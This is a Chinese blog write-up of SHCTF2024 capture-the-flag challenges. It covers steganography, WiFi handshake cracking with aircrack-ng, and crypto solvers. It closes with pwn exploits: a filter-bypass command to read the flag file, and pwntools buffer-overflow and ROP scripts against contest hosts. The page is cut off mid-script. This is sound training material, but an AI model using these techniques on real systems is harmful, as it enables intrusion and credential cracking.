<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SHCTF2024 | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="总排第28名,后续会对web复现
week1
Misc
签到题
公众号发对应内容就可以得到flag
Rasterizing Traffic
给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/ctf/shctf2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/ctf/shctf2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/ctf/shctf2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="SHCTF2024"><meta property="og:description" content="总排第28名,后续会对web复现
week1 Misc 签到题 公众号发对应内容就可以得到flag
Rasterizing Traffic 给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-30T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-30T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="SHCTF2024"><meta name=twitter:description content="总排第28名,后续会对web复现
week1
Misc
签到题
公众号发对应内容就可以得到flag
Rasterizing Traffic
给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://blog.0ran9e.cn/posts/ctf/"},{"@type":"ListItem","position":3,"name":"SHCTF2024","item":"http://blog.0ran9e.cn/posts/ctf/shctf2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SHCTF2024","name":"SHCTF2024","description":"总排第28名,后续会对web复现\nweek1 Misc 签到题 公众号发对应内容就可以得到flag\nRasterizing Traffic 给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的\n","keywords":["ctf"],"articleBody":"总排第28名,后续会对web复现\nweek1 Misc 签到题 公众号发对应内容就可以得到flag\nRasterizing Traffic 给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的\n最后一个导入010得到一个图片，网上搜索了一番知道是光栅隐写吧（是这么叫嘛）直接上exp，会跑出五个图片，拼接一下就行\nfrom PIL import Image import numpy as np img = np.array(Image.open('a.png').convert('L')) # 确保图像是灰度的 for i in range(5): z = np.zeros_like(img) # 创建全黑图像 z[:, i::5] = img[:, i::5] # 仅复制每5个像素的列 Image.fromarray(z).show() 拜师之旅① 给的图片不能正常查看，用010查看给加上正常的png开头给到图片，发现没有flag，crc爆破一下宽高得到flag\n有WiFi干嘛不用呢？ 简单的学一下\ncsv里面给了BSSID: EE:52:37:27:75:EB\nmay里面应该是密码字典，写个脚本提取一下内容，然后kali进行运行\naircrack-ng 01.cap -w pass.txt -b EE:52:37:27:75:EB -e target\nimport os directory = 'may' with open('pass.txt', 'w', encoding='utf-8') as output_file: files = os.listdir(directory) for file in files: file_path = os.path.join(directory, file) if os.path.isfile(file_path): try: with open(file_path, 'r', encoding='utf-8') as f: content = f.read() if len(content) \u003e 2: modified_content = content[1:-2] else: modified_content = content # 如果文件内容长度不够，则不进行截取 output_file.write(f\"{modified_content}\\n\") except Exception as e: print(f\"读取文件 {file} 时出错: {e}\") print(\"所有文件内容已保存到 pass.txt 中\") 真真假假?遮遮掩掩! 第一层我直接用伪加密工具Zipcenop进行的然后到了第二层，给了hint,SHCTF??????FTCHS，有点眼熟可以进行简单的猜测，最后得出是202410,然后带入解压得到flag，在线掩码爆破也行\nCrypto EzAES from Crypto.Cipher import AES import os # 替换为你之前打印的 IV 和 Key iv = b'\\x91\\x9c\\x9e\\x9fP\\x98%\\xd2{\\xbc\\xee|\\x98c\\x00\\xd2' # IV key = b'\\x1b\\x16\\xd9\\xc9\\xc9\\x10[u\\xd5\\xbeR\\x8f\\xd0\\x99\\xfe\\xc0' # Key # 读取密文 ciphertext = b'n\\xe0\\xe5\\xa7W\u0026\\x89\\x8d\\xe5\\xbd\\xc8\\xcf\\n]\\xbb\\xcfF","wordCount":"8638","inLanguage":"zh-cn","datePublished":"2024-10-30T00:00:00Z","dateModified":"2024-10-30T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/ctf/shctf2024/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=首页><span>首页</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=归档><span>归档</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=标签><span>标签</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=搜索><span>搜索</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=关于><span>关于</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-10-30 00:00:00 +0000 UTC'>October 30, 2024</span>&nbsp;·&nbsp;<span>18 min</span><h1 class=post-title>SHCTF2024</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><p>总排第28名,后续会对web复现</p><h1 id=week1>week1</h1><h2 id=misc>Misc</h2><h3 id=签到题>签到题</h3><p>公众号发对应内容就可以得到flag</p><h3 id=rasterizing-traffic>Rasterizing Traffic</h3><p>给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的</p><p>最后一个导入010得到一个图片，网上搜索了一番知道是光栅隐写吧（是这么叫嘛）直接上exp，会跑出五个图片，拼接一下就行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>img <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(Image<span style=color:#f92672>.</span>open(<span style=color:#e6db74>&#39;a.png&#39;</span>)<span style=color:#f92672>.</span>convert(<span style=color:#e6db74>&#39;L&#39;</span>))  <span style=color:#75715e># 确保图像是灰度的</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>    z <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>zeros_like(img)  <span style=color:#75715e># 创建全黑图像</span>
</span></span><span style=display:flex><span>    z[:, i::<span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> img[:, i::<span style=color:#ae81ff>5</span>]  <span style=color:#75715e># 仅复制每5个像素的列</span>
</span></span><span style=display:flex><span>    Image<span style=color:#f92672>.</span>fromarray(z)<span style=color:#f92672>.</span>show()
</span></span></code></pre></div><h3 id=拜师之旅>拜师之旅①</h3><p>给的图片不能正常查看，用010查看给加上正常的png开头给到图片，发现没有flag，crc爆破一下宽高得到flag</p><img src=../../images/shctf/2024/1.png alt=1 style=zoom:33%><h3 id=有wifi干嘛不用呢>有WiFi干嘛不用呢？</h3><p>简单的学一下</p><p>csv里面给了BSSID: <code>EE:52:37:27:75:EB</code></p><p>may里面应该是密码字典，写个脚本提取一下内容，然后kali进行运行</p><p><code>aircrack-ng 01.cap -w pass.txt -b EE:52:37:27:75:EB -e target</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>directory <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;may&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;pass.txt&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>) <span style=color:#66d9ef>as</span> output_file:
</span></span><span style=display:flex><span>    files <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>listdir(directory)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> files:
</span></span><span style=display:flex><span>        file_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(directory, file)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(file_path):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>with</span> open(file_path, <span style=color:#e6db74>&#39;r&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>                    content <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> len(content) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>                        modified_content <span style=color:#f92672>=</span> content[<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>]
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                        modified_content <span style=color:#f92672>=</span> content  <span style=color:#75715e># 如果文件内容长度不够，则不进行截取</span>
</span></span><span style=display:flex><span>                    output_file<span style=color:#f92672>.</span>write(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>modified_content<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;读取文件 </span><span style=color:#e6db74>{</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74> 时出错: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;所有文件内容已保存到 pass.txt 中&#34;</span>)
</span></span></code></pre></div><p><img alt=4 loading=lazy src=/posts/ctf/shctf2024/4.png></p><h3 id=真真假假遮遮掩掩>真真假假?遮遮掩掩!</h3><p>第一层我直接用伪加密工具Zipcenop进行的然后到了第二层，给了hint,SHCTF??????FTCHS，有点眼熟可以进行简单的猜测，最后得出是202410,然后带入解压得到flag，在线掩码爆破也行</p><h2 id=crypto>Crypto</h2><h3 id=ezaes>EzAES</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 替换为你之前打印的 IV 和 Key</span>
</span></span><span style=display:flex><span>iv <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x91\x9c\x9e\x9f</span><span style=color:#e6db74>P</span><span style=color:#ae81ff>\x98</span><span style=color:#e6db74>%</span><span style=color:#ae81ff>\xd2</span><span style=color:#e6db74>{</span><span style=color:#ae81ff>\xbc\xee</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\x98</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\x00\xd2</span><span style=color:#e6db74>&#39;</span>  <span style=color:#75715e># IV</span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x1b\x16\xd9\xc9\xc9\x10</span><span style=color:#e6db74>[u</span><span style=color:#ae81ff>\xd5\xbe</span><span style=color:#e6db74>R</span><span style=color:#ae81ff>\x8f\xd0\x99\xfe\xc0</span><span style=color:#e6db74>&#39;</span>  <span style=color:#75715e># Key</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 读取密文</span>
</span></span><span style=display:flex><span>ciphertext <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;n</span><span style=color:#ae81ff>\xe0\xe5\xa7</span><span style=color:#e6db74>W&amp;</span><span style=color:#ae81ff>\x89\x8d\xe5\xbd\xc8\xcf\n</span><span style=color:#e6db74>]</span><span style=color:#ae81ff>\xbb\xcf</span><span style=color:#e6db74>F&lt;sm</span><span style=color:#ae81ff>\xae\xb1</span><span style=color:#e6db74>yY</span><span style=color:#ae81ff>\xaa\x9a\x1a\x93</span><span style=color:#e6db74>*</span><span style=color:#ae81ff>\x80\xad</span><span style=color:#e6db74>:Q</span><span style=color:#ae81ff>\xb0\x1d</span><span style=color:#e6db74>9</span><span style=color:#ae81ff>\xc8</span><span style=color:#e6db74>w</span><span style=color:#ae81ff>\x08</span><span style=color:#e6db74>WR</span><span style=color:#ae81ff>\xea\x8c\xca\xd6\x99\xf5\x8b</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 创建 AES 解密对象</span>
</span></span><span style=display:flex><span>my_aes <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密</span>
</span></span><span style=display:flex><span>plaintext <span style=color:#f92672>=</span> my_aes<span style=color:#f92672>.</span>decrypt(ciphertext)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 去掉填充</span>
</span></span><span style=display:flex><span>plaintext <span style=color:#f92672>=</span> plaintext<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输出解密后的明文</span>
</span></span><span style=display:flex><span>print(plaintext)
</span></span></code></pre></div><h3 id=hello-crypto>Hello Crypto</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> <span style=color:#ae81ff>215055650564999213787435370441363980894435533627269060323553651075017072071074685867345899498649872049909340326243097196157</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><h3 id=baby_mod>baby_mod</h3><p>参考了一下某比赛的wp，需要用到LLL算法，在本地微调之后的脚本如下，不太懂密码，本地的sagemath也不太灵光</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sage.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 密文和泄露的信息</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>11454421006649444523173181606538145863693301443391411104476020392813188354552215237541156121746758260766189373235006192698011018103423719730694468959224</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> int(str(c) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;018990780114999724489697761346835348813863898197690613747060288212872603755938090881078090944985579244137762398288966180345904956701373459097473470489567378&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1457239467497770923738554308938779252194103808390298333375049349003518667390622623962565986306781435262634228918675745169896226699428349499145721234</span>
</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> int(str(leak) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;545270574817562202671727008676598472467510294490895807123478089330411790070820510557303676413421705544423508474571278325171268094198633442810872810490979940393221644842305735264574402808330041918352683831517808255366623997677143893057026579&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> <span style=color:#ae81ff>42606828099121205053846991305471624876675634413970417383658101034174961099590991091338816566296815476985911913200609816293298344668685957430209803900543</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> int(str(r) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;7862187841457950962311478142840359604893093112772355204586841584891592754560520121&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>t <span style=color:#f92672>=</span> <span style=color:#ae81ff>43431252615108394128004779879998409954355258544308741393719751627109295930373577434186230529781229842377724105486808348002663162365228575615973691647630</span>
</span></span><span style=display:flex><span>t <span style=color:#f92672>=</span> int(str(t) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;7150053640166059613223862263789840507159058492697264635797552295028685772559578491&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 构建矩阵</span>
</span></span><span style=display:flex><span>Ge <span style=color:#f92672>=</span> Matrix(ZZ, [
</span></span><span style=display:flex><span>    [leak, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>    [r, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>    [t, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>    [<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span><span style=color:#f92672>^</span><span style=color:#ae81ff>500</span>]
</span></span><span style=display:flex><span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 对第一列乘以 2^2000</span>
</span></span><span style=display:flex><span>Ge[:, <span style=color:#ae81ff>0</span>] <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>^</span><span style=color:#ae81ff>2000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># LLL 约简</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> Ge<span style=color:#f92672>.</span>LLL():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> line[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        p, q <span style=color:#f92672>=</span> abs(line[<span style=color:#ae81ff>1</span>]), abs(line[<span style=color:#ae81ff>2</span>])
</span></span><span style=display:flex><span>        n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>        d <span style=color:#f92672>=</span> inverse(Integer(<span style=color:#ae81ff>65537</span>), (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e># 将 m 转换为标准整数</span>
</span></span><span style=display:flex><span>        m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>        print(long_to_bytes(int(m)))
</span></span></code></pre></div><h3 id=factor>factor</h3><p>首先用yafu对N进行分解，然后带入对十选七进行全排列不重复，最后在答案区搜索SHCTF得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> itertools <span style=color:#f92672>import</span> combinations
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> prod
</span></span><span style=display:flex><span>primes <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10090316943954343501</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>9584538385744661071</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>9882099115896276037</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>12935778997315545353</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>14633606489606944033</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>17359021365807747733</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10674490894804861513</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>17744376529345008481</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>13075868978049623633</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>14346486611799750539</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>18791760293830179824015973110611716748918716697136891148879107606156801766019039764839524314819248940389704627215761359769781402984529</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> prod(primes)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> p_list <span style=color:#f92672>in</span> combinations(primes, <span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> prod(p_list)
</span></span><span style=display:flex><span>    phi <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> p_list:
</span></span><span style=display:flex><span>        phi <span style=color:#f92672>*=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(e, phi)
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;组合: </span><span style=color:#e6db74>{</span>p_list<span style=color:#e6db74>}</span><span style=color:#e6db74>, 解密后的 flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p><img alt=9 loading=lazy src=/posts/ctf/shctf2024/9.png></p><h2 id=pwn>Pwn</h2><h3 id=签个到吧>签个到吧</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>c<span style=color:#ae81ff>\a</span>t /f??? 1&gt;&amp;<span style=color:#ae81ff>2</span>
</span></span></code></pre></div><h3 id=no-stack-overflow1>No stack overflow1</h3><p>checksec一下发现有nx保护</p><p><img alt=6 loading=lazy src=/posts/ctf/shctf2024/6.png></p><p>ida打开发现有backdoor里面写入了bin/sh</p><p>一个gets的栈溢出，前面加\x00可以绕过，上exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;entry.shc.tf&#39;</span>,<span style=color:#ae81ff>28055</span>)
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x117</span><span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x4011DB</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h3 id=no-stack-overflow2>No stack overflow2</h3><p>checksec一下开了nx</p><p><img alt=13 loading=lazy src=/posts/ctf/shctf2024/13.png></p><p>用ida打开，F5查看伪代码，先看main函数，有大小比较用-1绕过，没有system和sh，溢出点在read函数</p><p>用ROP gadget &ndash;binary ‘vuln’ &ndash;only ‘pop|ret’ ，查找rdi和ret的地址</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> LibcSearcher <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 设置连接和ELF文件</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;210.44.150.15&#39;</span>, <span style=color:#ae81ff>26065</span>)
</span></span><span style=display:flex><span>elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./vuln&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 常量定义</span>
</span></span><span style=display:flex><span>rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0401223</span>
